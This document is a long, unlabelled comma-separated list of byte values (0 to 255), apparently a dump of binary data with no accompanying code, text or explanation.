33,255,159,129,165,75,115,124,61,25,96,139,173,141,170,9,59,43,68,67,134,181,217,194,232,44,42,90,95,82,222,248,211,199,237,22,43,87,72,93,219,175,200,255,175,28,40,85,67,104,188,185,223,250,62,43,90,64,118,98,154,172,153,242,228,63,52,11,119,118,140,230,204,249,88,66,29,58,42,42,205,242,136,177,92,120,22,54,216,252,193,233,147,174,97,86,21,61,112,168,131,157,221,232,8,27,73,122,148,139,190,209,217,197,82,125,79,120,150,179,250,204,233,12,13,10,82,127,135,152,133,179,195,8,6,49,94,107,130,143,158,193,248,224,16,94,91,48,206,248,222,229,201,93,55,90,126,110,139,239,153,180,176,160,65,100,9,223,200,243,143,173,172,78,114,24,0,42,197,200,191,253,19,18,36,25,93,108,176,241,198,226,3,3,62,94,64,119,135,162,202,228,46,25,61,70,68,209,161,212,205,173,12,43,53,21,124,152,191,222,198,237,36,53,33,67,106,146,155,213,250,239,44,106,40,77,45,216,244,146,178,84,120,30,6,15,42,199,247,152,187,160,92,50,32,40,35,195,229,137,175,87,65,28,57,8,41,204,241,135,176,91,93,56,113,153,159,192,232,146,173,74,122,27,62,35,216,193,236,136,166,70,104,38,31,158,109,187,155,139,172,79,116,10,51,222,250,247,151,185,93,67,107,21,48,205,253,253,202,168,31,10,42,11,41,201,235,238,148,188,166,65,30,14,47,210,247,141,149,128,92,122,26,60,32,198,238,178,191,235,17,5,99,8,222,199,242,142,139,171,77,113,23,63,41,196,225,145,178,180,89,111,24,3,223,253,157,191,163,168,122,87,28,97,113,134,168,192,226,224,28,4,75,96,153,152,200,199,239,6,17,7,64,126,180,242,151,212,237,12,48,2,64,101,154,145,202,240,230,7,26,25,87,101,191,243,157,255,28,62,73,37,92,124,162,164,210,249,30,39,106,60,77,74,194,232,198,225,31,20,82,68,72,88,197,160,212,199,14,118,24,80,38,141,173,166,197,255,65,60,84,116,109,153,143,162,211,230,0,41,69,126,91,112,184,217,203,249,58,39,64,90,147,143,183,198,235,92,66,106,20,47,204,219,252,159,132,90,67,110,10,40,200,201,237,147,187,165,64,29,13,46,209,246,235,148,191,91,121,51,22,155,139,168,246,145,174,94,127,98,7,221,198,241,236,138,170,76,112,22,62,40,195,224,144,144,179,88,110,23,2,222,252,156,190,129,141,98,55,91,120,117,139,182,197,207,166,3,61,101,116,130,243,132,129,207,182,22,32,82,98,136,241,154,133,161,94,126,96,4,42,210,252,151,180,164,164,71,108,2,43,214,242,144,176,82,118,123,99,13,40,197,245,150,185,94,116,124,77,46,111,132,171,211,173,64,127,103,22,67,99,159,187,204,224,30,52,126,28,61,150,177,175,196,226,27,55,105,21,80,132,151,179,203,164,73,102,68,64,126,117,181,202,198,218,67,63,90,112,51,215,177,219,246,91,17,59,123,119,103,218,189,215,198,10,14,40,9,39,38,200,236,146,186,164,127,28,12,45,208,212,234,147,190,90,120,24,58,222,196,203,245,144,173,93,126,97,6,220,239,226,175,199,236,75,111,21,61,39,194,159,238,143,178,87,109,22,1,221,251,155,156,128,166,78,120,19,48,32,193,228,232,190,167,82,110,12,44,206,242,178,173,205,234,4,113,18,53,218,240,153,132,191,93,125,31,3,41,209,251,150,179,130,163,70,107,1,42,213,241,143,175,81,84,122,98,12,39,196,244,149,184,93,82,123,76,47,41,208,226,138,185,90,77,120,25,21,46,158,171,202,163,75,38,62,69,112,146,139,229,130,170,78,101,119,16,63,135,177,189,198,230,53,46,39,65,90,46,157,251,209,228,68,113,12,15,116,153,189,192,255,9,15,24,28,72,104,156,178,157,159,88,37,127,92,87,100,147,184,145,185,163,126,27,11,44,46,211,233,146,189,89,119,23,57,221,34,202,244,143,172,92,125,96,5,219,35,206,234,136,168,74,110,20,60,38,193,253,237,142,177,86,108,63,45,146,191,177,207,191,195,46,46,95,47,155,142,131,231,219,197,26,34,11,109,132,241,151,158,136,163,64,112,17,52,217,239,152,226,190,92,124,30,2,40,208,250,149,145,129,162,69,106,0,41,212,240,142,174,175,83,121,97,11,38,195,217,185,190,255,31,63,101,68,146,190,179,227,200,188,12,37,124,93,104,200,163,209,249,3,23,34,16,59,222,178,171,199,253,5,27,35,95,54,152,177,169,199,242,66,94,103,107,86,134,183,151,139,206,40,59,42,14,117,148,176,220,249,89,127,103,112,11,40,216,249,156,129,87,64,107,102,4,36,198,234,144,184,162,125,26,10,10,45,210,232,145,188,88,118,22,56,59,33,201,243,142,171,113,81,81,65,113,118,205,251,135,187,73,40,87,110,113,150,178,171,204,221,91,98,90,112,146,140,177,201,241,212,66,50,80,107,150,222,204,230,239,234,32,33,75,105,196,240,177,211,198,162,44,32,96,126,153,173,246,165,243,26,123,80,64,68,132,182,243,214,201,161,68,105,63,40,211,239,141,140,174,82,120,96,10,37,194,242,147,149,186,80,121,100,0,222,254,224,132,137,177,91,118,19,3,36,199,198,175,162,241,31,42,15,127,154,178,183,196,251,235,36,123,93,112,146,174,129,224,175,237,3,37,12,122,140,172,194,195,245,74,71,108,67,119,157,166,209,250,13,56,77,35,70,102,148,168,155,157,86,44,6,21,78,98,134,233,131,250,224,31,82,39,9,96,144,164,223,247,87,117,21,22,58,32,200,242,141,170,90,123,30,98,56,33,204,232,134,166,72,108,18,58,3,222,251,235,140,175,84,106,19,62,57,215,221,180,243,230,3,33,16,125,110,181,153,168,187,224,1,42,9,109,138,139,188,156,194,239,63,110,66,115,148,204,179,169,188,90,122,28,0,38,206,215,242,143,191,160,67,104,62,39,210,238,235,139,173,81,119,31,9,36,193,241,241,148,185,79,82,78,126,143,184,210,163,235,228,20,48,64,80,118,165,229,136,139,241,19,47,94,99,159,168,173,251,132,171,22,55,94,106,128,190,149,214,250,56,91,32,70,114,154,248,136,133,235,233,14,99,64,118,144,190,221,179,87,92,68,110,9,38,214,247,154,191,85,93,72,100,2,34,196,232,142,182,160,123,119,103,8,43,208,230,143,186,86,94,94,91,118,150,147,184,223,230,41,116,49,51,118,32,214,231,225,182,19,57,80,76,81,221,182,171,200,225,31,105,18,28,56,214,246,152,188,162,74,116,15,11,59,220,255,228,186,163,78,106,8,40,41,205,243,155,133,160,125,109,14,27,24,133,177,215,239,89,41,73,87,113,44,146,191,207,190,18,16,38,61,96,152,204,234,138,172,80,118,30,8,35,192,207,240,147,184,78,119,98,62,220,252,253,225,135,175,89,116,17,1,8,232,234,159,136,179,79,109,13,47,211,249,225,234,133,162,82,115,22,59,209,250,229,224,190,94,64,100,10,50,246,218,157,134,203,244,30,45,127,52,218,180,220,251,253,56,23,62,90,108,179,178,215,247,213,70,21,38,85,98,130,181,204,253,60,87,34,35,64,120,142,177,142,235,26,82,123,22,108,140,135,128,223,231,23,42,63,41,121,145,139,171,209,204,68,98,43,91,72,148,154,189,217,255,27,14,52,85,126,179,239,197,254,245,10,50,63,75,114,184,240,183,252,229,31,40,83,6,53,204,162,200,236,11,124,32,76,76,123,134,243,158,186,88,120,26,62,3,43,213,240,141,189,94,65,102,60,37,47,203,233,137,171,79,117,29,7,34,244,227,230,144,227,31,55,17,105,148,149,142,164,207,225,22,50,93,85,73,198,192,218,203,251,6,15,88,125,128,177,153,173,202,232,55,104,71,123,152,154,147,211,189,64,127,51,91,89,130,187,147,174,194,229,4,45,10,53,209,239,143,144,180,90,66,108,7,36,212,245,152,156,178,91,70,98,0,32,194,230,140,180,189,88,95,72,15,43,138,165,200,208,177,89,53,95,126,149,166,187,217,245,255,49,62,81,124,184,211,183,194,235,38,24,34,22,29,219,188,169,204,228,81,10,46,89,121,152,244,150,186,160,72,81,108,9,57,218,253,226,184,161,76,104,101,5,39,203,241,153,131,94,123,107,107,14,25,228,251,159,253,25,54,113,72,74,109,157,157,142,180,25,12,44,115,96,122,153,186,193,204,10,58,85,96,26,143,140,166,242,230,0,117,50,115,57,208,249,210,215,204,87,38,71,120,105,80,197,149,194,253,4,35,104,121,130,132,183,142,199,238,25,23,14,107,142,159,161,206,240,92,99,98,69,98,155,245,189,160,193,234,6,96,9,52,208,238,237,143,179,89,65,107,6,35,211,244,246,155,177,90,69,97,63,223,193,229,139,146,188,125,89,42,64,96,153,227,222,215,250,51,32,94,54,154,141,238,137,133,181,86,121,30,52,221,200,228,130,162,163,71,109,21,63,218,247,231,136,171,175,111,67,75,112,135,176,212,235,30,238,51,101,90,125,128,189,173,199,236,10,5,43,104,40,195,242,203,208,24,35,8,38,125,48,192,180,223,241,0,36,50,104,85,108,180,244,206,246,29,56,100,4,2,127,136,175,228,249,1,115,87,37,124,147,128,237,144,181,75,116,31,26,56,216,250,158,132,172,86,113,14,62,62,33,198,156,133,176,76,64,39,98,106,157,169,231,198,26,3,50,82,118,72,147,143,212,215,9,56,34,70,125,173,135,185,136,129,226,0,31,8,51,207,204,236,142,178,88,64,106,5,34,210,210,245,154,176,89,68,74,19,222,192,228,233,145,187,86,115,99,4,39,204,226,234,149,177,79,111,17,53,241,238,169,169,193,180,85,120,29,51,220,199,227,129,128,162,70,108,20,62,217,246,230,135,137,132,105,100,74,123,158,189,247,234,248,230,14,56,115,99,145,147,224,186,17,230,12,55,66,119,156,139,197,196,31,25,26,29,88,120,175,240,151,229,16,0,53,91,82,105,154,142,132,238,30,57,16,89,85,36,154,163,197,233,30,6,45,42,86,151,135,185,233,227,11,33,57,25,55,215,249,157,131,171,85,112,13,28,61,32,197,155,132,175,75,105,9,10,46,212,252,204,172,27,29,35,87,22,44,213,192,156,186,90,124,96,6,46,55,210,239,159,128,163,72,30,7,24,0,159,174,202,227,22,43,105,25,33,100,148,179,203,238,44,23,76,124,177,185,132,161,194,255,29,33,98,3,38,203,192,233,148,176,78,110,16,52,218,194,203,230,131,179,84,119,28,50,219,198,200,178,182,169,14,40,92,113,155,251,182,170,136,176,67,56,88,123,162,163,214,213,253,246,58,61,79,94,131,169,222,249,189,168,68,98,2,36,200,238,150,128,186,87,71,104,11,48,198,239,154,182,179,83,117,25,21,10,159,169,193,237,90,5,13,89,111,109,129,172,215,226,3,35,42,39,126,155,152,159,218,250,33,81,58,81,54,214,248,156,130,170,84,111,107,27,60,223,196,154,131,174,74,104,103,9,7,254,181,160,200,9,77,58,63,90,99,167,177,218,250,89,63,81,68,12,114,148,162,220,254,236,34,79,67,83,109,152,158,216,249,62,126,46,74,63,47,208,243,152,174,87,66,30,60,220,221,193,231,143,185,126,92,75,47,37,41,255,232,147,175,77,109,15,51,217,32,202,229,130,178,121,91,85,116,146,145,192,204,251,244,7,43,64,125,159,151,205,176,194,235,16,42,66,50,148,190,176,149,239,230,10,58,68,97,214,191,215,147,188,167,67,97,1,35,199,237,149,158,185,124,107,110,2,125,128,173,216,198,198,0,59,126,123,117,133,164,229,247,204,9,5,79,126,102,182,176,215,227,250,0,59,2,104,156,142,234,144,178,243,21,60,69,116,129,247,215,192,234,28,1,106,26,59,222,195,153,130,173,73,70,102,8,6,255,180,161,247,8,76,69,54,88,100,188,184,220,241,10,63,86,16,95,118,149,171,219,219,237,10,85,15,15,127,134,167,139,235,27,60,103,37,123,98,141,179,217,200,2,2,88,125,124,185,140,170,199,211,91,112,50,78,3,124,177,168,218,221,2,45,77,50,113,150,201,228,129,177,82,117,26,48,243,14,255,157,189,95,67,105,17,59,252,255,134,173,195,171,65,106,21,49,207,206,240,190,151,230,2,34,4,52,213,248,252,146,187,166,66,96,0,34,236,193,182,206,244,20,3,102,20,46,144,162,184,219,194,31,50,84,61,37,207,234,135,150,183,90,127,21,62,41,197,227,131,132,130,99,56,37,115,140,200,251,140,140,166,70,46,89,124,167,164,223,195,233,227,56,61,80,82,137,145,217,205,172,170,69,108,15,96,146,182,175,253,85,249,4,102,19,123,157,253,215,226,48,62,50,43,78,120,128,132,207,244,160,17,53,45,14,108,129,232,138,174,84,124,69,96,61,45,206,241,150,134,120,14,89,81,109,219,166,169,195,216,20,41,86,77,71,111,142,180,212,238,10,57,121,68,127,182,200,167,206,241,81,48,92,99,117,99,176,249,238,27,1,41,66,78,96,152,169,226,195,227,64,105,20,48,45,205,239,147,147,140,14,51,81,103,212,203,251,197,245,234,9,108,113,96,134,202,190,221,244,27,8,101,8,45,195,203,246,146,176,122,95,22,60,36,206,233,229,149,182,115,83,29,63,102,145,133,227,139,227,1,60,87,89,131,148,186,163,233,225,0,48,115,41,129,180,209,252,134,244,5,41,24,107,157,137,212,128,151,166,10,49,97,109,158,177,166,241,246,193,25,36,18,100,144,191,215,250,86,87,123,97,9,51,206,235,177,145,13,230,45,33,76,123,134,175,234,163,3,22,68,91,114,109,205,160,217,171,73,127,40,89,112,153,254,168,205,245,30,34,125,30,1,38,252,229,144,172,96,71,57,74,108,156,139,146,243,238,19,60,116,3,63,35,174,201,254,4,0,43,127,26,59,149,131,168,210,251,58,27,71,75,75,214,171,223,249,231,74,120,2,98,126,213,182,209,250,235,12,30,62,32,35,201,241,155,182,121,110,42,66,100,117,202,177,212,252,28,52,71,75,102,158,146,171,249,230,25,42,19,104,104,141,192,164,204,231,76,48,91,106,133,131,148,153,221,237,77,62,93,50,210,244,152,183,168,175,74,103,23,18,246,133,197,210,200,227,67,49,74,41,198,254,233,223,253,251,26,41,67,119,193,190,196,224,251,27,41,41,8,118,131,171,154,185,243,237,49,53,79,102,147,160,138,172,172,68,67,23,127,110,159,188,209,248,3,76,60,68,98,150,176,176,194,189,21,28,37,73,8,37,230,228,203,238,26,27,47,92,68,143,143,225,242,239,12,61,58,12,53,32,252,176,151,92,64,102,109,61,31,139,177,165,131,230,44,50,37,72,121,203,163,212,255,11,73,109,88,92,127,187,191,201,241,241,58,85,78,106,97,141,182,220,208,30,14,42,109,10,116,134,186,144,234,0,49,20,126,103,103,132,162,221,209,3,63,87,125,96,68,179,211,200,206,67,115,73,119,155,36,129,166,204,163,8,50,95,115,144,189,147,206,193,237,8,52,98,99,147,151,244,201,199,234,66,36,77,40,206,246,255,176,154,174,64,37,95,111,155,185,216,198,245,93,45,92,66,127,130,166,250,131,248,228,39,48,78,115,182,183,194,206,254,29,48,19,127,105,130,184,193,236,194,18,45,100,28,245,214,207,198,253,224,75,102,28,107,97,189,177,207,222,243,20,40,97,117,157,140,178,248,229,29,80,57,74,119,144,183,179,148,75,111,85,108,11,49,134,170,211,195,226,21,23,53,94,111,142,190,197,219,24,14,42,77,74,120,128,248,194,246,225,49,80,49,16,109,142,161,153,169,81,4,47,37,103,141,141,161,202,233,31,58,126,127,70,99,151,167,218,224,86,55,80,121,75,108,212,179,197,247,6,51,90,55,46,35,138,178,235,230,10,30,84,118,153,131,176,211,208,173,4,36,86,121,149,247,222,217,212,239,0,39,3,58,205,144,187,202,229,227,21,26,74,118,155,182,153,193,243,3,120,82,71,115,132,164,221,181,145,141,50,81,79,12,233,182,160,208,238,27,49,72,106,108,153,162,222,196,176,21,37,64,97,146,169,225,137,146,173,96,87,27,62,35,249,200,160,204,232,3,104,12,50,218,238,178,248,226,233,79,116,10,51,222,250,152,184,112,112,7,37,80,48,205,253,158,129,166,91,68,111,11,41,201,193,162,241,19,2,65,30,14,47,210,247,141,182,161,125,122,26,60,32,198,238,178,158,20,14,5,99,8,222,199,242,142,172,76,110,18,23,63,41,196,225,145,178,85,122,16,50,46,141,184,196,254,239,25,113,6,21,96,103,154,167,199,209,30,38,84,124,97,156,183,154,130,172,71,100,20,53,55,220,242,155,134,162,64,96,2,38,43,211,253,152,181,165,70,67,35,112,158,158,183,145,172,83,35,78,76,75,158,149,179,196,245,19,54,30,9,37,195,194,228,136,174,86,64,27,56,40,201,236,240,134,175,90,118,20,52,214,250,202,202,223,233,1,45,26,105,113,177,133,191,212,224,22,40,71,114,217,223,158,239,217,226,10,115,79,123,221,249,151,183,184,92,66,106,20,47,204,252,157,128,132,90,67,110,10,40,226,199,135,237,24,175,25,89,13,37,209,174,200,191,248,31,113,77,105,142,150,227,223,230,14,19,127,127,7,137,149,184,201,171,7,44,51,89,114,40,195,224,144,177,84,121,110,23,2,222,252,156,190,162,72,112,121,20,49,11,239,156,132,227,26,116,29,13,84,193,160,214,241,238,21,54,92,94,54,198,241,195,193,161,51,94,66,75,102,210,252,151,180,164,69,104,13,35,43,214,242,144,176,82,118,28,4,46,40,239,216,238,183,29,39,29,5,36,89,207,176,200,221,16,44,79,120,106,200,215,239,221,234,89,57,82,112,154,181,254,230,144,171,72,120,25,60,33,247,255,234,134,164,68,102,10,48,216,194,183,180,199,239,5,38,8,127,147,248,210,219,246,91,2,58,19,106,133,186,156,237,145,46,9,34,9,97,142,233,141,179,186,164,127,28,12,45,208,245,139,180,190,90,120,50,23,215,138,163,223,229,228,14,49,17,8,140,151,184,140,166,57,89,24,88,114,115,145,202,236,184,31,27,44,85,81,221,230,155,243,238,71,66,59,64,48,44,178,246,254,20,7,115,34,77,111,129,190,152,128,170,69,98,113,18,53,218,240,153,132,160,126,30,31,41,4,159,190,222,231,163,20,53,68,1,108,156,241,143,175,81,117,27,3,12,39,196,244,149,146,112,122,30,83,80,97,176,182,201,227,38,58,80,121,104,103,132,187,236,175,80,48,94,123,156,180,169,182,221,227,33,51,86,114,70,207,172,172,209,224,2,55,72,103,180,207,169,221,209,232,0,33,7,45,219,167,166,220,182,22,1,43,93,97,202,250,250,157,130,88,65,108,8,38,198,232,166,188,247,230,54,79,11,126,138,160,201,211,239,24,63,116,55,143,134,178,212,195,252,92,57,46,68,219,129,162,202,199,166,24,43,77,125,106,177,210,207,236,254,58,108,8,94,220,191,215,253,206,171,31,50,75,110,147,144,227,206,23,71,81,109,11,43,205,241,151,149,132,11,4,112,24,103,139,170,193,194,19,13,48,82,67,32,131,168,220,243,242,10,102,36,73,41,134,181,215,239,28,36,26,109,116,38,145,188,210,183,92,114,27,79,44,245,210,165,203,238,83,56,75,121,69,99,200,225,138,188,91,99,25,102,119,152,242,246,220,230,18,53,82,76,62,154,175,189,208,231,16,100,1,126,222,145,181,222,211,235,5,37,64,47,136,154,243,221,240,28,45,36,98,99,189,156,181,206,206,32,64,47,73,100,197,229,164,223,241,246,62,84,95,109,204,243,245,140,188,81,56,83,125,142,129,153,188,250,239,23,46,80,115,210,134,190,211,211,167,84,109,96,41,82,141,210,217,222,229,54,107,88,126,152,182,213,187,190,164,76,92,60,46,222,255,226,173,112,233,25,34,10,55,204,162,211,231,233,238,15,59,67,118,139,161,219,193,94,23,58,94,78,107,207,249,148,177,139,111,1,46,106,96,221,167,217,236,2,115,101,96,94,118,139,150,199,229,30,34,54,40,67,222,178,161,199,229,30,124,23,19,3,14,234,236,130,171,86,88,61,75,127,144,251,175,196,230,69,59,68,77,105,150,174,231,205,228,9,55,7,47,113,146,187,215,210,165,74,114,91,46,49,135,160,215,237,25,50,22,92,103,102,223,189,203,217,2,127,56,73,36,151,151,172,214,246,237,12,82,70,42,153,158,169,144,253,30,117,21,55,219,235,229,251,201,228,31,123,23,11,138,144,168,177,199,234,56,56,87,93,62,246,158,184,222,234,13,43,95,78,216,240,221,218,244,245,25,48,99,121,152,153,251,195,246,229,8,107,71,123,158,187,208,239,134,168,118,32,64,123,131,174,216,212,250,82,54,80,65,101,158,248,142,176,243,242,6,49,127,107,162,162,192,237,78,93,36,77,76,125,128,189,226,254,21,79,52,34,124,146,177,159,131,169,81,81,88,18,2,35,198,193,172,163,44,127,43,93,101,155,183,226,128,223,74,49,39,66,115,159,243,177,199,238,78,112,84,68,103,158,189,227,133,187,73,61,75,124,114,128,164,222,254,87,49,36,76,70,106,214,247,154,191,127,83,45,75,102,34,136,161,192,182,238,41,77,92,108,121,208,168,202,242,2,116,81,101,143,144,138,241,216,230,23,122,79,77,216,138,132,231,209,234,9,107,87,112,35,254,250,234,161,131,90,45,92,120,217,254,254,221,239,247,5,25,91,105,187,231,178,161,227,226,2,26,68,105,137,161,248,155,203,242,40,57,75,99,214,229,157,209,244,16,45,88,113,112,139,255,222,227,255,28,18,103,32,38,148,190,222,228,225,80,122,85,71,35,140,177,210,251,244,78,119,98,62,246,209,204,199,241,17,21,4,93,64,97,138,134,142,160,86,28,63,72,118,146,181,145,137,174,6,17,58,64,105,148,137,177,196,56,101,36,41,75,117,220,234,148,214,224,17,44,46,123,122,147,179,223,222,86,48,37,46,71,105,213,246,153,190,126,80,97,12,83,100,128,166,223,193,13,53,113,66,84,127,128,136,193,205,7,54,74,116,116,174,146,163,206,251,23,53,127,85,146,152,202,168,203,237,18,41,94,109,100,220,181,168,201,226,30,66,60,22,245,145,187,210,145,140,13,61,75,43,219,252,254,201,148,230,3,44,7,39,201,237,242,154,132,95,86,65,73,126,144,235,243,158,186,88,120,26,62,36,204,246,145,167,144,26,15,35,60,37,208,236,138,137,171,79,117,29,7,34,255,239,144,146,157,96,127,51,114,151,180,222,129,171,224,23,58,68,65,115,145,173,191,164,232,29,108,0,104,145,240,165,200,240,194,3,55,86,123,130,141,176,201,54,48,40,34,89,98,219,246,147,131,164,71,75,97,10,53,209,239,143,177,85,123,66,108,7,36,254,216,214,248,27,40,103,96,19,114,141,178,207,241,40,123,22,120,27,41,199,190,222,176,18,61,87,67,110,137,197,171,196,230,87,122,94,77,116,140,175,134,129,163,88,116,15,62,70,152,240,174,198,233,1,62,68,59,114,154,181,150,224,211,3,61,13,110,148,155,253,132,219,234,3,104,64,111,200,203,241,153,131,94,123,107,12,47,212,201,242,157,185,87,93,52,52,103,133,176,239,201,230,20,51,107,111,118,142,187,232,198,248,27,32,89,84,33,247,230,160,222,255,24,54,46,105,156,242,208,204,196,238,7,114,18,63,122,144,232,178,220,194,6,36,11,97,144,180,208,197,131,160,80,113,20,57,207,248,227,191,93,92,126,98,8,48,240,216,155,198,237,224,74,37,68,117,130,136,237,190,0,11,0,59,6,109,129,161,195,249,0,123,76,105,113,144,136,177,200,253,8,62,124,40,73,105,142,179,140,170,83,55,51,18,58,186,167,165,198,166,26,54,89,81,120,221,200,228,130,162,68,104,14,21,63,218,247,231,136,171,80,76,34,87,112,155,167,149,168,95,91,113,95,103,121,139,168,225,229,239,75,101,87,96,100,135,165,214,128,93,103,52,11,39,97,134,176,206,236,94,51,72,101,118,202,129,161,139,232,18,62,54,78,104,129,201,179,200,231,77,53,82,5,32,253,204,237,144,181,75,116,31,59,217,211,182,151,192,226,19,113,87,125,145,135,181,221,213,227,2,43,88,88,222,162,204,166,210,95,1,34,70,108,139,165,226,183,179,21,50,40,83,108,151,161,215,137,205,232,8,92,88,51,210,237,222,225,243,10,20,106,9,113,156,178,196,207,26,22,68,44,127,157,143,168,138,178,92,86,115,99,4,39,204,226,139,182,120,98,33,84,125,143,195,239,220,247,20,6,44,82,124,174,131,170,206,239,2,42,57,124,60,217,235,184,135,239,2,36,3,22,96,128,179,196,184,26,8,49,11,14,53,140,169,161,198,26,25,39,102,1,45,168,188,254,155,8,43,40,90,12,117,137,177,155,181,16,54,89,122,117,123,156,132,136,186,70,99,99,48,118,126,137,182,142,238,3,55,74,93,139,219,141,165,143,180,74,115,30,58,216,248,211,176,204,239,85,121,67,120,140,133,137,210,204,236,67,58,91,98,142,165,181,230,207,23,78,59,64,118,157,246,237,227,186,8,51,38,6,46,216,243,186,178,128,163,72,30,45,31,138,162,201,141,255,5,42,61,65,115,209,188,208,242,251,88,65,90,113,159,190,183,139,177,167,11,114,107,77,99,153,165,198,252,248,13,102,85,100,131,150,236,213,235,84,31,56,28,102,148,136,226,198,233,66,69,107,19,23,245,252,161,200,236,78,74,100,89,118,131,181,223,254,21,38,59,44,97,44,133,191,203,246,31,27,36,42,65,36,134,188,195,212,30,42,104,97,3,126,137,166,206,245,26,33,80,50,115,107,144,175,217,185,71,125,44,125,82,111,139,172,205,228,75,125,82,76,61,150,139,168,193,255,73,114,29,57,253,251,241,206,205,230,27,44,12,48,147,144,141,206,194,252,31,44,8,38,156,150,175,166,193,15,12,38,82,62,158,176,188,218,235,45,47,86,109,97,155,167,136,201,254,240,3,29,72,126,132,191,169,194,229,16,126,36,66,99,159,189,190,181,132,122,6,80,121,246,211,235,204,193,252,84,113,97,2,15,231,164,199,214,175,77,109,15,51,217,193,235,172,142,246,29,51,27,116,137,137,160,249,95,189,68,47,94,126,158,167,173,243,166,233,12,34,122,101,159,188,213,182,18,1,5,60,5,112,152,176,242,227,18,4,4,97,71,106,199,237,149,191,90,119,70,103,10,47,197,238,179,152,22,32,89,89,120,38,205,235,205,244,27,53,50,95,73,36,131,170,205,234,74,112,24,97,60,217,201,234,141,178,72,113,54,21,112,134,187,222,129,169,83,110,11,59,59,222,233,180,198,227,12,103,7,41,44,210,250,228,191,92,76,109,16,31,230,150,171,200,236,88,103,30,65,96,148,153,190,212,200,175,3,82,76,92,155,134,165,204,175,85,125,103,2,223,207,240,242,151,173,86,65,29,59,219,215,204,245,128,168,83,122,96,64,108,153,211,166,146,179,76,53,77,124,157,146,171,213,210,255,19,39,110,62,156,138,169,210,234,16,15,46,17,59,214,243,227,132,134,171,65,106,21,49,207,239,145,181,113,143,3,19,10,113,155,177,209,179,65,166,13,20,14,103,136,165,248,233,22,25,2,102,9,46,196,237,152,180,82,114,115,23,61,37,207,234,135,157,117,54,48,71,88,39,128,173,202,233,73,114,118,45,116,138,174,231,201,255,14,28,76,89,120,147,246,154,128,168,82,109,10,25,58,221,194,152,129,172,72,102,44,42,101,148,177,183,190,30,5,37,99,99,102,158,186,153,241,30,121,29,3,43,52,207,236,156,189,160,69,27,46,2,42,200,232,138,174,84,124,102,1,222,206,206,219,187,233,0,18,72,58,199,252,186,169,207,254,1,38,105,14,102,134,180,170,145,173,75,107,13,49,215,255,233,227,128,176,123,89,88,103,136,143,222,156,161,94,27,43,94,127,135,179,178,177,203,235,18,29,26,117,128,167,220,180,185,161,75,102,3,51,212,247,156,178,186,143,108,22,70,47,215,184,147,177,207,90,86,54,0,122,134,162,153,161,3,31,38,85,121,82,206,244,134,249,35,87,59,90,116,100,196,226,130,164,72,77,117,31,58,215,199,232,161,157,79,22,119,4,96,211,249,225,177,182,2,100,63,93,119,210,211,197,207,255,4,32,18,6,55,208,181,173,239,60,68,46,64,91,100,209,252,152,182,86,120,28,2,9,51,206,235,177,145,17,1,82,87,13,56,137,168,137,233,29,58,101,17,150,99,205,182,220,171,84,127,27,57,217,218,254,206,161,182,81,110,30,63,34,38,252,207,189,134,103,106,12,48,214,254,199,226,191,133,125,55,86,107,215,194,253,155,187,93,65,103,37,20,154,163,149,181,193,251,127,104,19,47,205,237,143,146,184,160,74,101,40,31,151,184,222,144,252,247,12,95,120,32,217,234,215,215,244,26,16,45,113,34,135,165,223,222,248,0,61,82,59,109,136,160,209,181,240,22,52,127,107,104,143,166,129,229,239,76,116,30,57,214,198,231,138,175,69,77,120,62,31,151,167,212,255,224,80,87,103,82,116,153,137,197,246,220,72,6,45,76,101,207,247,225,188,89,73,106,108,17,39,208,251,189,152,27,50,83,52,8,32,131,165,154,239,17,13,25,51,67,40,212,173,199,172,6,53,42,63,125,98,204,239,148,170,83,126,26,56,29,244,253,227,139,181,80,109,29,62,42,8,242,183,192,219,13,39,78,39,166,206,177,172,241,250,28,39,116,45,203,32,238,212,245,92,76,116,93,56,159,142,188,175,207,168,126,103,18,46,204,236,237,187,154,86,26,43,113,101,128,180,173,220,176,208,109,106,112,144,151,186,165,249,181,79,66,114,72,100,193,230,132,195,174,2,49,87,117,110,204,231,132,147,180,87,124,18,17,11,232,205,196,207,224,75,115,29,56,213,197,230,137,132,142,8,57,86,49,216,183,217,248,165,252,6,42,89,84,152,173,149,163,169,246,13,46,75,75,192,179,174,242,52,31,7,39,87,38,198,242,216,251,29,34,58,81,82,119,196,165,213,251,30,18,119,46,78,111,145,229,194,229,24,21,52,82,118,109,203,168,218,169,82,125,25,22,54,216,252,226,138,180,79,70,49,21,123,106,191,227,220,229,4,39,105,108,97,219,216,224,239,226,2,62,117,34,113,145,178,213,185,82,119,43,66,126,101,141,176,202,196,175,49,42,80,110,155,202,236,144,182,94,72,99,0,48,209,211,248,164,154,171,111,28,48,207,194,203,170,204,252,89,55,17,109,103,143,187,181,129,190,31,32,95,118,66,203,251,226,192,252,26,52,114,120,119,193,211,223,195,235,6,114,28,55,212,196,229,136,140,162,75,118,18,26,253,224,150,179,131,164,90,101,16,54,208,246,223,254,200,239,2,111,80,104,197,245,130,186,18,243,15,106,67,100,141,182,217,179,83,84,120,30,6,48,203,232,152,185,92,138,91,81,79,110,144,228,209,229,18,54,8,93,75,123,143,174,211,250,37,40,62,125,53,145,178,225,137,179,78,107,122,27,62,9,212,226,141,169,71,103,9,12,50,240,233,150,242,227,4,36,84,88,102,154,250,151,184,30,59,55,92,84,124,136,245,158,140,166,109,101,13,44,104,129,187,195,244,93,11,35,124,96,99,210,247,141,182,161,125,27,59,247,13,198,238,152,179,80,64,97,4,3,210,131,188,203,172,76,110,18,56,32,202,196,203,188,252,7,47,68,124,118,192,253,157,191,163,73,113,27,54,211,195,228,204,166,229,4,48,17,38,199,165,214,223,204,226,8,39,71,124,188,231,221,213,201,225,64,46,71,110,152,244,208,247,250,230,70,47,71,36,205,248,148,178,177,83,119,29,5,47,202,205,186,252,244,26,117,23,77,107,134,227,140,161,10,0,15,86,125,90,211,169,223,238,60,13,57,88,115,214,243,232,198,253,4,29,58,84,104,100,240,173,192,233,5,54,103,69,116,145,151,158,254,229,5,3,36,70,126,154,249,209,254,89,125,99,106,20,47,204,252,157,128,165,123,78,34,3,108,134,175,142,189,84,3,55,113,64,107,163,236,201,251,233,48,26,51,51,145,138,164,195,241,1,42,38,11,100,145,135,178,221,171,75,109,17,55,223,40,195,224,144,177,84,83,34,118,102,150,168,156,240,237,1,36,91,103,135,134,194,251,138,228,12,39,64,111,130,181,243,223,200,171,70,99,19,52,215,252,241,176,168,228,50,86,117,113,153,178,201,196,180,169,69,97,5,104,143,184,223,211,190,1,57,28,25,46,141,163,197,198,248,18,49,29,68,101,129,173,200,168,173,85,127,26,55,39,200,193,189,175,166,23,58,90,103,150,183,202,193,185,255,11,61,87,114,110,148,250,207,226,21,20,